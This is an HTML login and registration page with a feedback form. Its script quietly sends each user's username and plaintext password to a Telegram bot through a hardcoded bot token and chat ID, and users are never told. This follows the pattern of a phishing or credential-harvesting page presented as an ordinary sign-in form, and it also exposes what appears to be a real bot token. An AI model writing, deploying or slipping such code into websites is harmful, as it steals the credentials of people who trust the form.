<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Login & Register with Telegram Notification</title>
  <style>
    body {
      background: #f0f0f0;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
      padding-top: 50px;
    }
    .container {
      background: #fff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      width: 320px;
      text-align: center;
    }
    input, textarea {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      font-size: 14px;
      border-radius: 5px;
      border: 1px solid #ccc;
      resize: vertical;
    }
    button {
      background-color: #3897f0;
      color: white;
      border: none;
      padding: 10px;
      width: 100%;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
      margin-top: 10px;
    }
    .toggle {
      margin-top: 15px;
      color: #00376b;
      font-size: 14px;
      cursor: pointer;
    }
    .hidden {
      display: none;
    }
    .success {
      color: green;
    }
    .error {
      color: red;
    }
    #welcomeMsg {
      font-weight: bold;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>

<div class="container" id="authContainer">
  <h2 id="formTitle">Register</h2>
  <input type="text" id="username" placeholder="Username" autocomplete="off" />
  <input type="password" id="password" placeholder="Password" autocomplete="off" />
  <button onclick="handleSubmit()">Submit</button>
  <div class="toggle" onclick="toggleMode()">Already have an account? Login</div>
  <p id="status"></p>
</div>

<div class="container hidden" id="feedbackContainer">
  <div id="welcomeMsg"></div>
  <textarea id="feedbackText" rows="5" placeholder="Write your feedback here..."></textarea>
  <button onclick="sendFeedback()">Send Feedback</button>
  <button style="margin-top: 10px; background: #ccc; color: black;" onclick="logout()">Logout</button>
  <p id="feedbackStatus"></p>
</div>

<script>
  let isLogin = false;
  let users = {};

  // Replace with your Telegram bot details:
  const botToken = '7769917776:AAG7myeUVy3HtP4zK-feu_iVvsdLDCO45-M';   // 🔁 Replace with your bot token
  const chatId = '1881744939';       // 🔁 Replace with your chat ID

  function toggleMode() {
    isLogin = !isLogin;
    document.getElementById("formTitle").innerText = isLogin ? "Login" : "Register";
    document.querySelector(".toggle").innerText = isLogin
      ? "Don't have an account? Register"
      : "Already have an account? Login";
    document.getElementById("status").innerText = "";
  }

  function handleSubmit() {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();
    const status = document.getElementById("status");

    if (!username || !password) {
      status.innerText = "Please fill in all fields.";
      status.className = "error";
      return;
    }

    if (isLogin) {
      if (users[username] && users[username] === password) {
        status.innerText = "";
        loginSuccess(username);
        sendToTelegram(`🔓 Login:\nUsername: ${username}\nPassword: ${password}`);
      } else {
        status.innerText = "Invalid credentials.";
        status.className = "error";
      }
    } else {
      if (users[username]) {
        status.innerText = "Username already taken.";
        status.className = "error";
      } else {
        users[username] = password;
        status.innerText = "Registered successfully. Now login.";
        status.className = "success";
        sendToTelegram(`✅ New registration:\nUsername: ${username}\nPassword: ${password}`);
        toggleMode(); // switch to login mode
      }
    }
  }

  function loginSuccess(username) {
    document.getElementById("authContainer").classList.add("hidden");
    document.getElementById("feedbackContainer").classList.remove("hidden");
    document.getElementById("welcomeMsg").innerText = `Welcome, ${username}!`;
    clearInputs();
  }

  function logout() {
    document.getElementById("authContainer").classList.remove("hidden");
    document.getElementById("feedbackContainer").classList.add("hidden");
    document.getElementById("status").innerText = "";
    document.getElementById("feedbackStatus").innerText = "";
    clearInputs();
  }

  function clearInputs() {
    document.getElementById("username").value = "";
    document.getElementById("password").value = "";
    document.getElementById("feedbackText").value = "";
  }

  function sendFeedback() {
    const feedback = document.getElementById("feedbackText").value.trim();
    const feedbackStatus = document.getElementById("feedbackStatus");

    if (!feedback) {
      feedbackStatus.innerText = "Please enter feedback before sending.";
      feedbackStatus.className = "error";
      return;
    }

    sendToTelegram(`💬 Feedback from user:\n${feedback}`)
      .then(() => {
        feedbackStatus.innerText = "Feedback sent successfully!";
        feedbackStatus.className = "success";
        document.getElementById("feedbackText").value = "";
      })
      .catch(() => {
        feedbackStatus.innerText = "Failed to send feedback.";
        feedbackStatus.className = "error";
      });
  }

  async function sendToTelegram(msg) {
    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: msg }),
      });
      if (!response.ok) throw new Error("Telegram API error");
    } catch (error) {
      console.error("Telegram send error:", error);
      throw error;
    }
  }
</script>

</body>
</html>
